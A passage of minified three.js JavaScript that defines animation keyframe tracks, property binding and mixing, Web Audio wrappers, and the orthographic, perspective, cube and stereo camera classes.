d=\nthis._paths,e=this._parsedPaths,f=this._bindings,g=f.length-1,h=f[g];b[a[g]]=c;f[c]=h;f.pop();e[c]=e[g];e.pop();d[c]=d[g];d.pop()}}};\nTHREE.AnimationUtils={arraySlice:function(a,b,c){return THREE.AnimationUtils.isTypedArray(a)?new a.constructor(a.subarray(b,c)):a.slice(b,c)},convertArray:function(a,b,c){return!a||!c&&a.constructor===b?a:\"number\"===typeof b.BYTES_PER_ELEMENT?new b(a):Array.prototype.slice.call(a)},isTypedArray:function(a){return ArrayBuffer.isView(a)&&!(a instanceof DataView)},getKeyframeOrder:function(a){for(var b=a.length,c=Array(b),d=0;d!==b;++d)c[d]=d;c.sort(function(b,c){return a[b]-a[c]});return c},sortedArray:function(a,\nb,c){for(var d=a.length,e=new a.constructor(d),f=0,g=0;g!==d;++f)for(var h=c[f]*b,k=0;k!==b;++k)e[g++]=a[h+k];return e},flattenJSON:function(a,b,c,d){for(var e=1,f=a[0];void 0!==f&&void 0===f[d];)f=a[e++];if(void 0!==f){var g=f[d];if(void 0!==g)if(Array.isArray(g)){do g=f[d],void 0!==g&&(b.push(f.time),c.push.apply(c,g)),f=a[e++];while(void 0!==f)}else if(void 0!==g.toArray){do g=f[d],void 0!==g&&(b.push(f.time),g.toArray(c,c.length)),f=a[e++];while(void 0!==f)}else{do g=f[d],void 0!==g&&(b.push(f.time),\nc.push(g)),f=a[e++];while(void 0!==f)}}}};THREE.KeyframeTrack=function(a,b,c,d){if(void 0===a)throw Error(\"track name is undefined\");if(void 0===b||0===b.length)throw Error(\"no keyframes in track named \"+a);this.name=a;this.times=THREE.AnimationUtils.convertArray(b,this.TimeBufferType);this.values=THREE.AnimationUtils.convertArray(c,this.ValueBufferType);this.setInterpolation(d||this.DefaultInterpolation);this.validate();this.optimize()};\nTHREE.KeyframeTrack.prototype={constructor:THREE.KeyframeTrack,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodDiscrete:function(a){return new THREE.DiscreteInterpolant(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodLinear:function(a){return new THREE.LinearInterpolant(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:function(a){return new THREE.CubicInterpolant(this.times,\nthis.values,this.getValueSize(),a)},setInterpolation:function(a){var b;switch(a){case THREE.InterpolateDiscrete:b=this.InterpolantFactoryMethodDiscrete;break;case THREE.InterpolateLinear:b=this.InterpolantFactoryMethodLinear;break;case THREE.InterpolateSmooth:b=this.InterpolantFactoryMethodSmooth}if(void 0===b){b=\"unsupported interpolation for \"+this.ValueTypeName+\" keyframe track named \"+this.name;if(void 0===this.createInterpolant)if(a!==this.DefaultInterpolation)this.setInterpolation(this.DefaultInterpolation);\nelse throw Error(b);console.warn(b)}else this.createInterpolant=b},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return THREE.InterpolateDiscrete;case this.InterpolantFactoryMethodLinear:return THREE.InterpolateLinear;case this.InterpolantFactoryMethodSmooth:return THREE.InterpolateSmooth}},getValueSize:function(){return this.values.length/this.times.length},shift:function(a){if(0!==a)for(var b=this.times,c=0,d=b.length;c!==d;++c)b[c]+=a;return this},\nscale:function(a){if(1!==a)for(var b=this.times,c=0,d=b.length;c!==d;++c)b[c]*=a;return this},trim:function(a,b){for(var c=this.times,d=c.length,e=0,f=d-1;e!==d&&c[e]<a;)++e;for(;-1!==f&&c[f]>b;)--f;++f;if(0!==e||f!==d)e>=f&&(f=Math.max(f,1),e=f-1),d=this.getValueSize(),this.times=THREE.AnimationUtils.arraySlice(c,e,f),this.values=THREE.AnimationUtils.arraySlice(this.values,e*d,f*d);return this},validate:function(){var a=!0,b=this.getValueSize();0!==b-Math.floor(b)&&(console.error(\"invalid value size in track\",\nthis),a=!1);var c=this.times,b=this.values,d=c.length;0===d&&(console.error(\"track is empty\",this),a=!1);for(var e=null,f=0;f!==d;f++){var g=c[f];if(\"number\"===typeof g&&isNaN(g)){console.error(\"time is not a valid number\",this,f,g);a=!1;break}if(null!==e&&e>g){console.error(\"out of order keys\",this,f,g,e);a=!1;break}e=g}if(void 0!==b&&THREE.AnimationUtils.isTypedArray(b))for(f=0,c=b.length;f!==c;++f)if(d=b[f],isNaN(d)){console.error(\"value is not a valid number\",this,f,d);a=!1;break}return a},optimize:function(){for(var a=\nthis.times,b=this.values,c=this.getValueSize(),d=1,e=1,f=a.length-1;e<=f;++e){var g=!1,h=a[e];if(h!==a[e+1]&&(1!==e||h!==h[0]))for(var k=e*c,l=k-c,n=k+c,h=0;h!==c;++h){var p=b[k+h];if(p!==b[l+h]||p!==b[n+h]){g=!0;break}}if(g){if(e!==d)for(a[d]=a[e],g=e*c,k=d*c,h=0;h!==c;++h)b[k+h]=b[g+h];++d}}d!==a.length&&(this.times=THREE.AnimationUtils.arraySlice(a,0,d),this.values=THREE.AnimationUtils.arraySlice(b,0,d*c));return this}};\nObject.assign(THREE.KeyframeTrack,{parse:function(a){if(void 0===a.type)throw Error(\"track type undefined, can not parse\");var b=THREE.KeyframeTrack._getTrackTypeForValueTypeName(a.type);if(void 0===a.times){var c=[],d=[];THREE.AnimationUtils.flattenJSON(a.keys,c,d,\"value\");a.times=c;a.values=d}return void 0!==b.parse?b.parse(a):new b(a.name,a.times,a.values,a.interpolation)},toJSON:function(a){var b=a.constructor;if(void 0!==b.toJSON)b=b.toJSON(a);else{var b={name:a.name,times:THREE.AnimationUtils.convertArray(a.times,\nArray),values:THREE.AnimationUtils.convertArray(a.values,Array)},c=a.getInterpolation();c!==a.DefaultInterpolation&&(b.interpolation=c)}b.type=a.ValueTypeName;return b},_getTrackTypeForValueTypeName:function(a){switch(a.toLowerCase()){case \"scalar\":case \"double\":case \"float\":case \"number\":case \"integer\":return THREE.NumberKeyframeTrack;case \"vector\":case \"vector2\":case \"vector3\":case \"vector4\":return THREE.VectorKeyframeTrack;case \"color\":return THREE.ColorKeyframeTrack;case \"quaternion\":return THREE.QuaternionKeyframeTrack;\ncase \"bool\":case \"boolean\":return THREE.BooleanKeyframeTrack;case \"string\":return THREE.StringKeyframeTrack}throw Error(\"Unsupported typeName: \"+a);}});THREE.PropertyBinding=function(a,b,c){this.path=b;this.parsedPath=c||THREE.PropertyBinding.parseTrackName(b);this.node=THREE.PropertyBinding.findNode(a,this.parsedPath.nodeName)||a;this.rootNode=a};\nTHREE.PropertyBinding.prototype={constructor:THREE.PropertyBinding,getValue:function(a,b){this.bind();this.getValue(a,b)},setValue:function(a,b){this.bind();this.setValue(a,b)},bind:function(){var a=this.node,b=this.parsedPath,c=b.objectName,d=b.propertyName,e=b.propertyIndex;a||(this.node=a=THREE.PropertyBinding.findNode(this.rootNode,b.nodeName)||this.rootNode);this.getValue=this._getValue_unavailable;this.setValue=this._setValue_unavailable;if(a){if(c){var f=b.objectIndex;switch(c){case \"materials\":if(!a.material){console.error(\"  can not bind to material as node does not have a material\",\nthis);return}if(!a.material.materials){console.error(\"  can not bind to material.materials as node.material does not have a materials array\",this);return}a=a.material.materials;break;case \"bones\":if(!a.skeleton){console.error(\"  can not bind to bones as node does not have a skeleton\",this);return}a=a.skeleton.bones;for(c=0;c<a.length;c++)if(a[c].name===f){f=c;break}break;default:if(void 0===a[c]){console.error(\"  can not bind to objectName of node, undefined\",this);return}a=a[c]}if(void 0!==f){if(void 0===\na[f]){console.error(\"  trying to bind to objectIndex of objectName, but is undefined:\",this,a);return}a=a[f]}}f=a[d];if(void 0===f)console.error(\"  trying to update property for track: \"+b.nodeName+\".\"+d+\" but it wasn't found.\",a);else{b=this.Versioning.None;void 0!==a.needsUpdate?(b=this.Versioning.NeedsUpdate,this.targetObject=a):void 0!==a.matrixWorldNeedsUpdate&&(b=this.Versioning.MatrixWorldNeedsUpdate,this.targetObject=a);c=this.BindingType.Direct;if(void 0!==e){if(\"morphTargetInfluences\"===\nd){if(!a.geometry){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry\",this);return}if(!a.geometry.morphTargets){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry.morphTargets\",this);return}for(c=0;c<this.node.geometry.morphTargets.length;c++)if(a.geometry.morphTargets[c].name===e){e=c;break}}c=this.BindingType.ArrayElement;this.resolvedProperty=f;this.propertyIndex=e}else void 0!==f.fromArray&&void 0!==f.toArray?\n(c=this.BindingType.HasFromToArray,this.resolvedProperty=f):void 0!==f.length?(c=this.BindingType.EntireArray,this.resolvedProperty=f):this.propertyName=d;this.getValue=this.GetterByBindingType[c];this.setValue=this.SetterByBindingTypeAndVersioning[c][b]}}else console.error(\"  trying to update node for track: \"+this.path+\" but it wasn't found.\")},unbind:function(){this.node=null;this.getValue=this._getValue_unbound;this.setValue=this._setValue_unbound}};\nObject.assign(THREE.PropertyBinding.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},_getValue_unbound:THREE.PropertyBinding.prototype.getValue,_setValue_unbound:THREE.PropertyBinding.prototype.setValue,BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(a,b){a[b]=this.node[this.propertyName]},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)a[b++]=\nc[d]},function(a,b){a[b]=this.resolvedProperty[this.propertyIndex]},function(a,b){this.resolvedProperty.toArray(a,b)}],SetterByBindingTypeAndVersioning:[[function(a,b){this.node[this.propertyName]=a[b]},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++]},function(a,b){for(var c=this.resolvedProperty,\nd=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.needsUpdate=!0},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty[this.propertyIndex]=a[b]},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty.fromArray(a,\nb)},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.matrixWorldNeedsUpdate=!0}]]});THREE.PropertyBinding.Composite=function(a,b,c){c=c||THREE.PropertyBinding.parseTrackName(b);this._targetGroup=a;this._bindings=a.subscribe_(b,c)};\nTHREE.PropertyBinding.Composite.prototype={constructor:THREE.PropertyBinding.Composite,getValue:function(a,b){this.bind();var c=this._bindings[this._targetGroup.nCachedObjects_];void 0!==c&&c.getValue(a,b)},setValue:function(a,b){for(var c=this._bindings,d=this._targetGroup.nCachedObjects_,e=c.length;d!==e;++d)c[d].setValue(a,b)},bind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,c=a.length;b!==c;++b)a[b].bind()},unbind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,\nc=a.length;b!==c;++b)a[b].unbind()}};THREE.PropertyBinding.create=function(a,b,c){return a instanceof THREE.AnimationObjectGroup?new THREE.PropertyBinding.Composite(a,b,c):new THREE.PropertyBinding(a,b,c)};\nTHREE.PropertyBinding.parseTrackName=function(a){var b=/^(([\\w]+\\/)*)([\\w-\\d]+)?(\\.([\\w]+)(\\[([\\w\\d\\[\\]\\_.:\\- ]+)\\])?)?(\\.([\\w.]+)(\\[([\\w\\d\\[\\]\\_. ]+)\\])?)$/,c=b.exec(a);if(!c)throw Error(\"cannot parse trackName at all: \"+a);c.index===b.lastIndex&&b.lastIndex++;b={nodeName:c[3],objectName:c[5],objectIndex:c[7],propertyName:c[9],propertyIndex:c[11]};if(null===b.propertyName||0===b.propertyName.length)throw Error(\"can not parse propertyName from trackName: \"+a);return b};\nTHREE.PropertyBinding.findNode=function(a,b){if(!b||\"\"===b||\"root\"===b||\".\"===b||-1===b||b===a.name||b===a.uuid)return a;if(a.skeleton){var c=function(a){for(var c=0;c<a.bones.length;c++){var d=a.bones[c];if(d.name===b)return d}return null}(a.skeleton);if(c)return c}if(a.children){var d=function(a){for(var c=0;c<a.length;c++){var g=a[c];if(g.name===b||g.uuid===b||(g=d(g.children)))return g}return null};if(c=d(a.children))return c}return null};\nTHREE.PropertyMixer=function(a,b,c){this.binding=a;this.valueSize=c;a=Float64Array;switch(b){case \"quaternion\":b=this._slerp;break;case \"string\":case \"bool\":a=Array;b=this._select;break;default:b=this._lerp}this.buffer=new a(4*c);this._mixBufferRegion=b;this.referenceCount=this.useCount=this.cumulativeWeight=0};\nTHREE.PropertyMixer.prototype={constructor:THREE.PropertyMixer,accumulate:function(a,b){var c=this.buffer,d=this.valueSize,e=a*d+d,f=this.cumulativeWeight;if(0===f){for(f=0;f!==d;++f)c[e+f]=c[f];f=b}else f+=b,this._mixBufferRegion(c,e,0,b/f,d);this.cumulativeWeight=f},apply:function(a){var b=this.valueSize,c=this.buffer;a=a*b+b;var d=this.cumulativeWeight,e=this.binding;this.cumulativeWeight=0;1>d&&this._mixBufferRegion(c,a,3*b,1-d,b);for(var d=b,f=b+b;d!==f;++d)if(c[d]!==c[d+b]){e.setValue(c,a);\nbreak}},saveOriginalState:function(){var a=this.buffer,b=this.valueSize,c=3*b;this.binding.getValue(a,c);for(var d=b;d!==c;++d)a[d]=a[c+d%b];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(a,b,c,d,e){if(.5<=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){THREE.Quaternion.slerpFlat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var f=1-d,g=0;g!==e;++g){var h=b+g;a[h]=a[h]*f+a[c+g]*d}}};\nTHREE.BooleanKeyframeTrack=function(a,b,c){THREE.KeyframeTrack.call(this,a,b,c)};THREE.BooleanKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.BooleanKeyframeTrack,ValueTypeName:\"bool\",ValueBufferType:Array,DefaultInterpolation:THREE.InterpolateDiscrete,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});THREE.ColorKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.ColorKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.ColorKeyframeTrack,ValueTypeName:\"color\"});THREE.NumberKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};THREE.NumberKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.NumberKeyframeTrack,ValueTypeName:\"number\"});THREE.QuaternionKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.QuaternionKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.QuaternionKeyframeTrack,ValueTypeName:\"quaternion\",DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodLinear:function(a){return new THREE.QuaternionLinearInterpolant(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:void 0});THREE.StringKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.StringKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.StringKeyframeTrack,ValueTypeName:\"string\",ValueBufferType:Array,DefaultInterpolation:THREE.InterpolateDiscrete,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});THREE.VectorKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\nTHREE.VectorKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.VectorKeyframeTrack,ValueTypeName:\"vector\"});\nTHREE.Audio=function(a){THREE.Object3D.call(this);this.type=\"Audio\";this.context=a.context;this.source=this.context.createBufferSource();this.source.onended=this.onEnded.bind(this);this.gain=this.context.createGain();this.gain.connect(a.getInput());this.autoplay=!1;this.startTime=0;this.playbackRate=1;this.isPlaying=!1;this.hasPlaybackControl=!0;this.sourceType=\"empty\";this.filters=[]};\nTHREE.Audio.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Audio,getOutput:function(){return this.gain},setNodeSource:function(a){this.hasPlaybackControl=!1;this.sourceType=\"audioNode\";this.source=a;this.connect();return this},setBuffer:function(a){this.source.buffer=a;this.sourceType=\"buffer\";this.autoplay&&this.play();return this},play:function(){if(!0===this.isPlaying)console.warn(\"THREE.Audio: Audio is already playing.\");else if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");\nelse{var a=this.context.createBufferSource();a.buffer=this.source.buffer;a.loop=this.source.loop;a.onended=this.source.onended;a.start(0,this.startTime);a.playbackRate.value=this.playbackRate;this.isPlaying=!0;this.source=a;return this.connect()}},pause:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.source.stop(),this.startTime=this.context.currentTime,this.isPlaying=!1,this},stop:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");\nelse return this.source.stop(),this.startTime=0,this.isPlaying=!1,this},connect:function(){if(0<this.filters.length){this.source.connect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-1].connect(this.filters[a]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-\n1].disconnect(this.filters[a]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());return this},getFilters:function(){return this.filters},setFilters:function(a){a||(a=[]);!0===this.isPlaying?(this.disconnect(),this.filters=a,this.connect()):this.filters=a;return this},getFilter:function(){return this.getFilters()[0]},setFilter:function(a){return this.setFilters(a?[a]:[])},setPlaybackRate:function(a){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");\nelse return this.playbackRate=a,!0===this.isPlaying&&(this.source.playbackRate.value=this.playbackRate),this},getPlaybackRate:function(){return this.playbackRate},onEnded:function(){this.isPlaying=!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn(\"THREE.Audio: this Audio has no playback control.\"),!1):this.source.loop},setLoop:function(a){!1===this.hasPlaybackControl?console.warn(\"THREE.Audio: this Audio has no playback control.\"):this.source.loop=a},getVolume:function(){return this.gain.gain.value},\nsetVolume:function(a){this.gain.gain.value=a;return this}});THREE.AudioAnalyser=function(a,b){this.analyser=a.context.createAnalyser();this.analyser.fftSize=void 0!==b?b:2048;this.data=new Uint8Array(this.analyser.frequencyBinCount);a.getOutput().connect(this.analyser)};\nObject.assign(THREE.AudioAnalyser.prototype,{getFrequencyData:function(){this.analyser.getByteFrequencyData(this.data);return this.data},getAverageFrequency:function(){for(var a=0,b=this.getFrequencyData(),c=0;c<b.length;c++)a+=b[c];return a/b.length}});Object.defineProperty(THREE,\"AudioContext\",{get:function(){var a;return function(){void 0===a&&(a=new (window.AudioContext||window.webkitAudioContext));return a}}()});\nTHREE.PositionalAudio=function(a){THREE.Audio.call(this,a);this.panner=this.context.createPanner();this.panner.connect(this.gain)};\nTHREE.PositionalAudio.prototype=Object.assign(Object.create(THREE.Audio.prototype),{constructor:THREE.PositionalAudio,getOutput:function(){return this.panner},getRefDistance:function(){return this.panner.refDistance},setRefDistance:function(a){this.panner.refDistance=a},getRolloffFactor:function(){return this.panner.rolloffFactor},setRolloffFactor:function(a){this.panner.rolloffFactor=a},getDistanceModel:function(){return this.panner.distanceModel},setDistanceModel:function(a){this.panner.distanceModel=\na},getMaxDistance:function(){return this.panner.maxDistance},setMaxDistance:function(a){this.panner.maxDistance=a},updateMatrixWorld:function(){var a=new THREE.Vector3;return function(b){THREE.Object3D.prototype.updateMatrixWorld.call(this,b);a.setFromMatrixPosition(this.matrixWorld);this.panner.setPosition(a.x,a.y,a.z)}}()});\nTHREE.AudioListener=function(){THREE.Object3D.call(this);this.type=\"AudioListener\";this.context=THREE.AudioContext;this.gain=this.context.createGain();this.gain.connect(this.context.destination);this.filter=null};\nTHREE.AudioListener.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.AudioListener,getInput:function(){return this.gain},removeFilter:function(){null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null)},getFilter:function(){return this.filter},setFilter:function(a){null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):\nthis.gain.disconnect(this.context.destination);this.filter=a;this.gain.connect(this.filter);this.filter.connect(this.context.destination)},getMasterVolume:function(){return this.gain.gain.value},setMasterVolume:function(a){this.gain.gain.value=a},updateMatrixWorld:function(){var a=new THREE.Vector3,b=new THREE.Quaternion,c=new THREE.Vector3,d=new THREE.Vector3;return function(e){THREE.Object3D.prototype.updateMatrixWorld.call(this,e);e=this.context.listener;var f=this.up;this.matrixWorld.decompose(a,\nb,c);d.set(0,0,-1).applyQuaternion(b);e.setPosition(a.x,a.y,a.z);e.setOrientation(d.x,d.y,d.z,f.x,f.y,f.z)}}()});THREE.Camera=function(){THREE.Object3D.call(this);this.type=\"Camera\";this.matrixWorldInverse=new THREE.Matrix4;this.projectionMatrix=new THREE.Matrix4};THREE.Camera.prototype=Object.create(THREE.Object3D.prototype);THREE.Camera.prototype.constructor=THREE.Camera;\nTHREE.Camera.prototype.getWorldDirection=function(){var a=new THREE.Quaternion;return function(b){b=b||new THREE.Vector3;this.getWorldQuaternion(a);return b.set(0,0,-1).applyQuaternion(a)}}();THREE.Camera.prototype.lookAt=function(){var a=new THREE.Matrix4;return function(b){a.lookAt(this.position,b,this.up);this.quaternion.setFromRotationMatrix(a)}}();THREE.Camera.prototype.clone=function(){return(new this.constructor).copy(this)};\nTHREE.Camera.prototype.copy=function(a){THREE.Object3D.prototype.copy.call(this,a);this.matrixWorldInverse.copy(a.matrixWorldInverse);this.projectionMatrix.copy(a.projectionMatrix);return this};\nTHREE.CubeCamera=function(a,b,c){THREE.Object3D.call(this);this.type=\"CubeCamera\";var d=new THREE.PerspectiveCamera(90,1,a,b);d.up.set(0,-1,0);d.lookAt(new THREE.Vector3(1,0,0));this.add(d);var e=new THREE.PerspectiveCamera(90,1,a,b);e.up.set(0,-1,0);e.lookAt(new THREE.Vector3(-1,0,0));this.add(e);var f=new THREE.PerspectiveCamera(90,1,a,b);f.up.set(0,0,1);f.lookAt(new THREE.Vector3(0,1,0));this.add(f);var g=new THREE.PerspectiveCamera(90,1,a,b);g.up.set(0,0,-1);g.lookAt(new THREE.Vector3(0,-1,0));\nthis.add(g);var h=new THREE.PerspectiveCamera(90,1,a,b);h.up.set(0,-1,0);h.lookAt(new THREE.Vector3(0,0,1));this.add(h);var k=new THREE.PerspectiveCamera(90,1,a,b);k.up.set(0,-1,0);k.lookAt(new THREE.Vector3(0,0,-1));this.add(k);this.renderTarget=new THREE.WebGLRenderTargetCube(c,c,{format:THREE.RGBFormat,magFilter:THREE.LinearFilter,minFilter:THREE.LinearFilter});this.updateCubeMap=function(a,b){null===this.parent&&this.updateMatrixWorld();var c=this.renderTarget,m=c.texture.generateMipmaps;c.texture.generateMipmaps=\n!1;c.activeCubeFace=0;a.render(b,d,c);c.activeCubeFace=1;a.render(b,e,c);c.activeCubeFace=2;a.render(b,f,c);c.activeCubeFace=3;a.render(b,g,c);c.activeCubeFace=4;a.render(b,h,c);c.texture.generateMipmaps=m;c.activeCubeFace=5;a.render(b,k,c);a.setRenderTarget(null)}};THREE.CubeCamera.prototype=Object.create(THREE.Object3D.prototype);THREE.CubeCamera.prototype.constructor=THREE.CubeCamera;\nTHREE.OrthographicCamera=function(a,b,c,d,e,f){THREE.Camera.call(this);this.type=\"OrthographicCamera\";this.zoom=1;this.view=null;this.left=a;this.right=b;this.top=c;this.bottom=d;this.near=void 0!==e?e:.1;this.far=void 0!==f?f:2E3;this.updateProjectionMatrix()};\nTHREE.OrthographicCamera.prototype=Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.OrthographicCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.left=a.left;this.right=a.right;this.top=a.top;this.bottom=a.bottom;this.near=a.near;this.far=a.far;this.zoom=a.zoom;this.view=null===a.view?null:Object.assign({},a.view);return this},setViewOffset:function(a,b,c,d,e,f){this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},\nclearViewOffset:function(){this.view=null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=(this.right-this.left)/(2*this.zoom),b=(this.top-this.bottom)/(2*this.zoom),c=(this.right+this.left)/2,d=(this.top+this.bottom)/2,e=c-a,c=c+a,a=d+b,b=d-b;if(null!==this.view)var c=this.zoom/(this.view.width/this.view.fullWidth),b=this.zoom/(this.view.height/this.view.fullHeight),f=(this.right-this.left)/this.view.width,d=(this.top-this.bottom)/this.view.height,e=e+this.view.offsetX/c*f,\nc=e+this.view.width/c*f,a=a-this.view.offsetY/b*d,b=a-this.view.height/b*d;this.projectionMatrix.makeOrthographic(e,c,a,b,this.near,this.far)},toJSON:function(a){a=THREE.Object3D.prototype.toJSON.call(this,a);a.object.zoom=this.zoom;a.object.left=this.left;a.object.right=this.right;a.object.top=this.top;a.object.bottom=this.bottom;a.object.near=this.near;a.object.far=this.far;null!==this.view&&(a.object.view=Object.assign({},this.view));return a}});\nTHREE.PerspectiveCamera=function(a,b,c,d){THREE.Camera.call(this);this.type=\"PerspectiveCamera\";this.fov=void 0!==a?a:50;this.zoom=1;this.near=void 0!==c?c:.1;this.far=void 0!==d?d:2E3;this.focus=10;this.aspect=void 0!==b?b:1;this.view=null;this.filmGauge=35;this.filmOffset=0;this.updateProjectionMatrix()};\nTHREE.PerspectiveCamera.prototype=Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.PerspectiveCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.fov=a.fov;this.zoom=a.zoom;this.near=a.near;this.far=a.far;this.focus=a.focus;this.aspect=a.aspect;this.view=null===a.view?null:Object.assign({},a.view);this.filmGauge=a.filmGauge;this.filmOffset=a.filmOffset;return this},setFocalLength:function(a){a=.5*this.getFilmHeight()/a;this.fov=2*THREE.Math.RAD2DEG*Math.atan(a);\nthis.updateProjectionMatrix()},getFocalLength:function(){var a=Math.tan(.5*THREE.Math.DEG2RAD*this.fov);return.5*this.getFilmHeight()/a},getEffectiveFOV:function(){return 2*THREE.Math.RAD2DEG*Math.atan(Math.tan(.5*THREE.Math.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(a,b,c,d,e,f){this.aspect=a/b;this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,\nwidth:e,height:f};this.updateProjectionMatrix()},clearViewOffset:function(){this.view=null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var a=this.near,b=a*Math.tan(.5*THREE.Math.DEG2RAD*this.fov)/this.zoom,c=2*b,d=this.aspect*c,e=-.5*d,f=this.view;if(null!==f)var g=f.fullWidth,h=f.fullHeight,e=e+f.offsetX*d/g,b=b-f.offsetY*c/h,d=f.width/g*d,c=f.height/h*c;f=this.filmOffset;0!==f&&(e+=a*f/this.getFilmWidth());this.projectionMatrix.makeFrustum(e,e+d,b-c,b,a,this.far)},toJSON:function(a){a=\nTHREE.Object3D.prototype.toJSON.call(this,a);a.object.fov=this.fov;a.object.zoom=this.zoom;a.object.near=this.near;a.object.far=this.far;a.object.focus=this.focus;a.object.aspect=this.aspect;null!==this.view&&(a.object.view=Object.assign({},this.view));a.object.filmGauge=this.filmGauge;a.object.filmOffset=this.filmOffset;return a}});\nTHREE.StereoCamera=function(){this.type=\"StereoCamera\";this.aspect=1;this.cameraL=new THREE.PerspectiveCamera;this.cameraL.layers.enable(1);this.cameraL.matrixAutoUpdate=!1;this.cameraR=new THREE.PerspectiveCamera;this.cameraR.layers.enable(2);this.cameraR.matrixAutoUpdate=!1};\nObject.assign(THREE.StereoCamera.prototype,{update:function(){var a,b,c,d,e,f=new THREE.Matrix4,g=new THREE.Matrix4;return function(h){if(a!==h.focus||b!==h.fov||c!==h.aspect*this.aspect||d!==h.near||e!==h.far){a=h.focus;b=h.fov;c=h.aspect*this.aspect;d=h.near;e=h.far;var k=h.projectionMatrix.clone(),l=.032*d/a,n=d*Math.tan(THREE.Math.DEG2RAD*b*.5),p,m;g.elements[12]=-.032;f.elements[12]=.032;p=-n*c+l;m=n*c+l;k.elements[0]=2*d/(m-p);k.elements[8]=(m+p)/(m-p);this.cameraL.projectionMatrix.copy(k);\np=-n*c-l;m=n*c-l;k.elements[0]=2*d/(m-p);k.elements[8]=(m+p)/(m-p);this.cameraR.projectionMatrix.copy(k)}this.cameraL.matrixWorld.copy(h.matrixWorld).multiply(g);this.cameraR.matrixWorld.copy(h.matrixWorld).multiply(f)}}()});THREE.Light=function(a,b){THREE.Object3D.call(this);this.type=\"Light\";this.color=new THREE.Color(a);this.intensity=void 